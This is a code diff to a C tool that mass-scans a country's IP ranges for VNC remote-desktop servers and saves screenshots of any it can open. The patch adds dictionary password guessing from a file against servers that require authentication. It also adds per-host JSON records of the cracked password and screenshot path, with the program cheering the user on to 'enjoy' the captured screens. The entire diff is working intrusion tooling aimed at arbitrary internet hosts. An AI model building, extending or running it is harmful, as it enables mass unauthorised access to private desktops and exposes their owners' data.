@@ -24,6 +24,7 @@
 #include <sys/wait.h>
 #include <sys/time.h>
 #include <sys/types.h>
+#include <sys/stat.h>
 #include <time.h>
 #include <unistd.h>
 #define TCP_PORT 5900
@@ -67,6 +68,8 @@ static void print_usage(const char *progname) {
   printf("  -r, --resume         Resume from .line checkpoint\n");
   printf("  -R, --rate N         Limit scans to N IPs per second\n");
   printf("  -P, --password PASS  Use PASS for VNC auth (if required)\n");
+  printf("  -F, --password-file  Read passwords from file (one per line)\n");
+  printf("  -M, --metadata-dir   Output per-host metadata JSON files\n");
   printf("  -b, --allowblank     Allow blank (all black) screenshots\n");
   printf("  -B, --ignoreblank    Skip blank (all black) screenshots\n");
   printf("  -Q, --quality N      JPEG quality 1-100 (default 100)\n");
@@ -107,9 +110,16 @@ int is_command_in_path(const char *command) {
 static int run_vncsnapshot(const char *ip_addr, int port, int timeout_sec);
 #endif
 static int capture_snapshot(const char *ip_addr, int port, int timeout_sec,
-                            int verbose, const char *password);
+                            int verbose, const char *password, int allow_blank,
+                            int jpeg_quality, int rect_x, int rect_y,
+                            int rect_w, int rect_h);
 static int parse_ports(const char *arg, int *ports, size_t max_ports);
 static int parse_rect(const char *arg, int *x, int *y, int *w, int *h);
+
+typedef struct {
+  char **items;
+  size_t count;
+} password_list_t;
 
 typedef struct {
   uint32_t start;
@@ -127,17 +137,22 @@ typedef struct {
   uint64_t online_hosts;
   uint64_t vnc_found;
   uint64_t vnc_noauth;
+  uint64_t auth_attempts;
+  uint64_t auth_success;
   uint64_t screenshots;
   int snapshot_timeout;
   int verbose;
   int quiet;
-  const char *password;
+  const password_list_t *passwords;
   int allow_blank;
   int jpeg_quality;
   int rect_x;
   int rect_y;
   int rect_w;
   int rect_h;
+  const char *metadata_dir;
+  const char *country_code;
+  const char *country_name;
   int ports[8];
   size_t port_count;
   int resume_enabled;
@@ -156,13 +171,15 @@ static int load_country_ranges(const char *file_location,
                                const char *country_code,
                                ip_range_t **ranges_out,
                                size_t *range_count_out,
-                               uint64_t *total_ips_out) {
+                               uint64_t *total_ips_out,
+                               char **country_name_out) {
   FILE *file = fopen(file_location, "r");
   char line[1024];
   ip_range_t *ranges = NULL;
   size_t range_count = 0;
   size_t range_capacity = 0;
   uint64_t total_ips = 0;
+  char *country_name = NULL;
 
   if (file == NULL) {
     perror(COLOR_RED "Failed to open CSV file" COLOR_RESET);
@@ -171,10 +188,10 @@ static int load_country_ranges(const char *file_location,
 
   while (fgets(line, sizeof(line), file) != NULL) {
     char start_ip_str[20], end_ip_str[20], csv_country_code[3],
-        country_name[50];
+        csv_country_name[50];
     int parsed = sscanf(line, "\"%19[^\"]\",\"%19[^\"]\",\"%2[^\"]\",\"%49[^\"]\"",
                         start_ip_str, end_ip_str, csv_country_code,
-                        country_name);
+                        csv_country_name);
     if (parsed != 4) {
       continue;
     }
@@ -188,6 +205,9 @@ static int load_country_ranges(const char *file_location,
       continue;
     }
 
+    if (!country_name) {
+      country_name = strdup(csv_country_name);
+    }
     if (range_count == range_capacity) {
       size_t new_capacity = range_capacity == 0 ? 64 : range_capacity * 2;
       ip_range_t *new_ranges =
@@ -211,6 +231,11 @@ static int load_country_ranges(const char *file_location,
   *ranges_out = ranges;
   *range_count_out = range_count;
   *total_ips_out = total_ips;
+  if (country_name_out) {
+    *country_name_out = country_name;
+  } else {
+    free(country_name);
+  }
   return 0;
 }
 
@@ -281,6 +306,152 @@ static int parse_rect(const char *arg, int *x, int *y, int *w, int *h) {
   *w = rw;
   *h = rh;
   return 0;
+}
+
+static void free_password_list(password_list_t *list) {
+  if (!list) {
+    return;
+  }
+  for (size_t i = 0; i < list->count; i++) {
+    free(list->items[i]);
+  }
+  free(list->items);
+  list->items = NULL;
+  list->count = 0;
+}
+
+static int add_password(password_list_t *list, const char *value) {
+  if (!list || !value || value[0] == '\0') {
+    return 0;
+  }
+  char **next = realloc(list->items, (list->count + 1) * sizeof(*list->items));
+  if (!next) {
+    return -1;
+  }
+  list->items = next;
+  list->items[list->count] = strdup(value);
+  if (!list->items[list->count]) {
+    return -1;
+  }
+  list->count++;
+  return 0;
+}
+
+static int load_password_file(password_list_t *list, const char *path) {
+  FILE *file = fopen(path, "r");
+  char line[512];
+
+  if (!file) {
+    return -1;
+  }
+
+  while (fgets(line, sizeof(line), file)) {
+    char *start = line;
+    char *end = NULL;
+    while (*start && (*start == ' ' || *start == '\t' || *start == '\r' ||
+                      *start == '\n')) {
+      start++;
+    }
+    if (*start == '\0' || *start == '#') {
+      continue;
+    }
+    end = start + strlen(start);
+    while (end > start && (end[-1] == '\n' || end[-1] == '\r' ||
+                           end[-1] == ' ' || end[-1] == '\t')) {
+      end--;
+    }
+    *end = '\0';
+    if (add_password(list, start) != 0) {
+      fclose(file);
+      return -1;
+    }
+  }
+
+  fclose(file);
+  return 0;
+}
+
+static void json_escape(FILE *file, const char *value) {
+  for (const char *p = value; *p; p++) {
+    switch (*p) {
+    case '\\':
+      fputs("\\\\", file);
+      break;
+    case '"':
+      fputs("\\\"", file);
+      break;
+    case '\n':
+      fputs("\\n", file);
+      break;
+    case '\r':
+      fputs("\\r", file);
+      break;
+    case '\t':
+      fputs("\\t", file);
+      break;
+    default:
+      fputc(*p, file);
+      break;
+    }
+  }
+}
+
+static void write_metadata(const scan_context_t *ctx, const char *ip_addr,
+                           int port, int vnc_state, int online,
+                           const char *password_used, int screenshot_ok) {
+  if (!ctx->metadata_dir) {
+    return;
+  }
+
+  char path[256];
+  if (snprintf(path, sizeof(path), "%s/%s.json", ctx->metadata_dir, ip_addr) >=
+      (int)sizeof(path)) {
+    return;
+  }
+
+  FILE *file = fopen(path, "w");
+  if (!file) {
+    return;
+  }
+
+  time_t now = time(NULL);
+
+  fputs("{\n", file);
+  fprintf(file, "  \"ip\": \"");
+  json_escape(file, ip_addr);
+  fprintf(file, "\",\n");
+  fprintf(file, "  \"port\": %d,\n", port);
+  fprintf(file, "  \"country_code\": \"");
+  json_escape(file, ctx->country_code ? ctx->country_code : "");
+  fprintf(file, "\",\n");
+  fprintf(file, "  \"country_name\": \"");
+  json_escape(file, ctx->country_name ? ctx->country_name : "");
+  fprintf(file, "\",\n");
+  fprintf(file, "  \"online\": %s,\n", online ? "true" : "false");
+  fprintf(file, "  \"vnc_detected\": %s,\n", vnc_state >= 0 ? "true" : "false");
+  fprintf(file, "  \"auth_required\": %s,\n", vnc_state == 0 ? "true" : "false");
+  fprintf(file, "  \"auth_success\": %s,\n",
+          password_used ? "true" : "false");
+  if (password_used) {
+    fprintf(file, "  \"password_used\": \"");
+    json_escape(file, password_used);
+    fprintf(file, "\",\n");
+  } else {
+    fprintf(file, "  \"password_used\": null,\n");
+  }
+  fprintf(file, "  \"screenshot_saved\": %s,\n",
+          screenshot_ok ? "true" : "false");
+  if (screenshot_ok) {
+    fprintf(file, "  \"screenshot_path\": \"");
+    json_escape(file, ip_addr);
+    fprintf(file, ".jpg\",\n");
+  } else {
+    fprintf(file, "  \"screenshot_path\": null,\n");
+  }
+  fprintf(file, "  \"timestamp\": %lld\n", (long long)now);
+  fputs("}\n", file);
+
+  fclose(file);
 }
 
 static int read_resume_offset(const char *path, uint64_t *offset_out) {
@@ -425,16 +596,20 @@ static void update_progress(scan_context_t *ctx, int force) {
   uint64_t vnc_found = ctx->vnc_found;
   uint64_t vnc_noauth = ctx->vnc_noauth;
   uint64_t shots = ctx->screenshots;
+  uint64_t auth_attempts = ctx->auth_attempts;
+  uint64_t auth_success = ctx->auth_success;
   pthread_mutex_unlock(&ctx->stats_mutex);
 
   double pct = total ? (double)scanned * 100.0 / (double)total : 0.0;
-  printf("\r\033[2KProgress: %llu/%llu (%.1f%%) online:%llu vnc:%llu noauth:%llu shots:%llu",
+  printf("\r\033[2KProgress: %llu/%llu (%.1f%%) online:%llu vnc:%llu noauth:%llu auth:%llu/%llu shots:%llu",
          (unsigned long long)scanned,
          (unsigned long long)total,
          pct,
          (unsigned long long)online,
          (unsigned long long)vnc_found,
          (unsigned long long)vnc_noauth,
+         (unsigned long long)auth_success,
+         (unsigned long long)auth_attempts,
          (unsigned long long)shots);
   fflush(stdout);
   ctx->last_print = now;
@@ -469,9 +644,10 @@ static void *scan_worker(void *arg) {
     int online = is_ip_up(ip_addr);
     int vnc_state = -1;
     int took_shot = 0;
+    const char *password_used = NULL;
+    int port_used = 0;
 
     if (online) {
-      int port_used = 0;
       for (size_t i = 0; i < ctx->port_count; i++) {
         vnc_state = get_security(ip_addr, ctx->ports[i], ctx->verbose != 0);
         if (vnc_state >= 0) {
@@ -479,13 +655,32 @@ static void *scan_worker(void *arg) {
           break;
         }
       }
-      if ((vnc_state == 1 ||
-           (vnc_state == 0 && ctx->password != NULL)) &&
-          capture_snapshot(ip_addr, port_used, ctx->snapshot_timeout,
-                           ctx->verbose, ctx->password, ctx->allow_blank,
-                           ctx->jpeg_quality, ctx->rect_x, ctx->rect_y,
-                           ctx->rect_w, ctx->rect_h) == 0) {
-        took_shot = 1;
+      if (vnc_state == 1) {
+        if (capture_snapshot(ip_addr, port_used, ctx->snapshot_timeout,
+                             ctx->verbose, NULL, ctx->allow_blank,
+                             ctx->jpeg_quality, ctx->rect_x, ctx->rect_y,
+                             ctx->rect_w, ctx->rect_h) == 0) {
+          took_shot = 1;
+        }
+      } else if (vnc_state == 0 && ctx->passwords &&
+                 ctx->passwords->count > 0) {
+        for (size_t i = 0; i < ctx->passwords->count; i++) {
+          const char *candidate = ctx->passwords->items[i];
+          pthread_mutex_lock(&ctx->stats_mutex);
+          ctx->auth_attempts++;
+          pthread_mutex_unlock(&ctx->stats_mutex);
+          if (capture_snapshot(ip_addr, port_used, ctx->snapshot_timeout,
+                               ctx->verbose, candidate, ctx->allow_blank,
+                               ctx->jpeg_quality, ctx->rect_x, ctx->rect_y,
+                               ctx->rect_w, ctx->rect_h) == 0) {
+            password_used = candidate;
+            took_shot = 1;
+            pthread_mutex_lock(&ctx->stats_mutex);
+            ctx->auth_success++;
+            pthread_mutex_unlock(&ctx->stats_mutex);
+            break;
+          }
+        }
       }
     } else if (ctx->verbose) {
       pthread_mutex_lock(&ctx->print_mutex);
@@ -509,6 +704,11 @@ static void *scan_worker(void *arg) {
     }
     pthread_mutex_unlock(&ctx->stats_mutex);
 
+    if (vnc_state >= 0) {
+      write_metadata(ctx, ip_addr, port_used, vnc_state, online, password_used,
+                     took_shot);
+    }
+
     update_progress(ctx, 0);
     checkpoint_update(ctx, 0);
   }
@@ -527,15 +727,18 @@ int parse_and_check_ips(const char *file_location, const char *country_code,
                         int workers, int snapshot_timeout, int verbose,
                         int quiet, const int *ports, size_t port_count,
                         int resume_enabled, uint64_t resume_offset,
-                        int rate_limit, const char *password, int allow_blank,
-                        int jpeg_quality, int rect_x, int rect_y, int rect_w,
-                        int rect_h) {
+                        int rate_limit, const password_list_t *passwords,
+                        int allow_blank, int jpeg_quality, int rect_x,
+                        int rect_y, int rect_w, int rect_h,
+                        const char *metadata_dir) {
   ip_range_t *ranges = NULL;
   size_t range_count = 0;
   uint64_t total_ips = 0;
+  char *country_name = NULL;
 
   if (load_country_ranges(file_location, country_code, &ranges, &range_count,
-                          &total_ips) != 0) {
+                          &total_ips, &country_name) != 0) {
+    free(country_name);
     return 0;
   }
 
@@ -543,6 +746,7 @@ int parse_and_check_ips(const char *file_location, const char *country_code,
     printf(COLOR_YELLOW "No ranges found for country code %s.\n" COLOR_RESET,
            country_code);
     free(ranges);
+    free(country_name);
     return 0;
   }
 
@@ -561,13 +765,16 @@ int parse_and_check_ips(const char *file_location, const char *country_code,
   ctx.snapshot_timeout = snapshot_timeout;
   ctx.verbose = verbose;
   ctx.quiet = quiet;
-  ctx.password = password;
+  ctx.passwords = passwords;
   ctx.allow_blank = allow_blank;
   ctx.jpeg_quality = jpeg_quality;
   ctx.rect_x = rect_x;
   ctx.rect_y = rect_y;
   ctx.rect_w = rect_w;
   ctx.rect_h = rect_h;
+  ctx.metadata_dir = metadata_dir;
+  ctx.country_code = country_code;
+  ctx.country_name = country_name;
   ctx.port_count = port_count;
   ctx.resume_enabled = resume_enabled;
   ctx.resume_offset = resume_offset;
@@ -607,6 +814,7 @@ int parse_and_check_ips(const char *file_location, const char *country_code,
   pthread_t *threads = calloc((size_t)worker_count, sizeof(*threads));
   if (!threads) {
     free(ranges);
+    free(country_name);
     return 0;
   }
 
@@ -639,6 +847,7 @@ int parse_and_check_ips(const char *file_location, const char *country_code,
   pthread_mutex_destroy(&ctx.print_mutex);
   free(threads);
   free(ranges);
+  free(country_name);
   return (int)ctx.screenshots;
 }
 
@@ -761,6 +970,8 @@ int main(int argc, char **argv) {
   int resume_enabled = 0;
   int rate_limit = 0;
   char *password = NULL;
+  char *password_file = NULL;
+  const char *metadata_dir = "metadata";
   int allow_blank = 0;
   int jpeg_quality = 100;
   int rect_x = -1;
@@ -778,6 +989,8 @@ int main(int argc, char **argv) {
       {"resume", no_argument, 0, 'r'},
       {"rate", required_argument, 0, 'R'},
       {"password", required_argument, 0, 'P'},
+      {"password-file", required_argument, 0, 'F'},
+      {"metadata-dir", required_argument, 0, 'M'},
       {"allowblank", no_argument, 0, 'b'},
       {"ignoreblank", no_argument, 0, 'B'},
       {"quality", required_argument, 0, 'Q'},
@@ -813,8 +1026,8 @@ int main(int argc, char **argv) {
     return 1;
   }
 #endif
-  while ((opt = getopt_long(argc, argv, "c:f:w:t:p:rR:P:bBQ:x:vqh",
-                            &option_index)) != -1) {
+  while ((opt = getopt_long(argc, argv, "c:f:w:t:p:rR:P:F:M:bBQ:x:vqh",
+                            long_options, &option_index)) != -1) {
     switch (opt) {
     case 'c':
       if (country_code) {
@@ -889,6 +1102,22 @@ int main(int argc, char **argv) {
         free(file_location);
         return 1;
       }
+      break;
+    case 'F':
+      if (password_file) {
+        free(password_file);
+      }
+      password_file = strdup(optarg);
+      if (!password_file) {
+        fprintf(stderr, COLOR_RED "Out of memory.\n" COLOR_RESET);
+        free(country_code);
+        free(file_location);
+        free(password);
+        return 1;
+      }
+      break;
+    case 'M':
+      metadata_dir = optarg;
       break;
     case 'b':
       allow_blank = 1;
@@ -989,6 +1218,43 @@ int main(int argc, char **argv) {
     quiet = 0;
   }
 
+  password_list_t passwords = {0};
+  if (password_file) {
+    if (load_password_file(&passwords, password_file) != 0) {
+      fprintf(stderr, COLOR_RED "Failed to read password file.\n" COLOR_RESET);
+      free(country_code);
+      free(file_location);
+      free(password);
+      free(password_file);
+      return 1;
+    }
+  }
+  if (password) {
+    if (add_password(&passwords, password) != 0) {
+      fprintf(stderr, COLOR_RED "Failed to store password.\n" COLOR_RESET);
+      free(country_code);
+      free(file_location);
+      free(password);
+      free(password_file);
+      free_password_list(&passwords);
+      return 1;
+    }
+  }
+
+  const char *metadata_dir_used = NULL;
+  if (metadata_dir && metadata_dir[0] != '\0') {
+    if (mkdir(metadata_dir, 0755) != 0 && errno != EEXIST) {
+      fprintf(stderr, COLOR_RED "Failed to create metadata directory.\n" COLOR_RESET);
+      free(country_code);
+      free(file_location);
+      free(password);
+      free(password_file);
+      free_password_list(&passwords);
+      return 1;
+    }
+    metadata_dir_used = metadata_dir;
+  }
+
   uint64_t resume_offset = 0;
   if (resume_enabled) {
     if (read_resume_offset(".line", &resume_offset) != 0) {
@@ -1006,9 +1272,9 @@ int main(int argc, char **argv) {
                                       worker_override, snapshot_timeout,
                                       verbose, quiet, ports, port_count,
                                       resume_enabled, resume_offset,
-                                      rate_limit, password, allow_blank,
+                                      rate_limit, &passwords, allow_blank,
                                       jpeg_quality, rect_x, rect_y, rect_w,
-                                      rect_h);
+                                      rect_h, metadata_dir_used);
   printf(COLOR_GREEN
          "\nAll done. Enjoy %d new screenshots in this folder\n" COLOR_RESET,
          num_shots);
@@ -1021,5 +1287,8 @@ int main(int argc, char **argv) {
     free(country_code);
   if (password)
     free(password);
+  if (password_file)
+    free(password_file);
+  free_password_list(&passwords);
   return 0;
 }
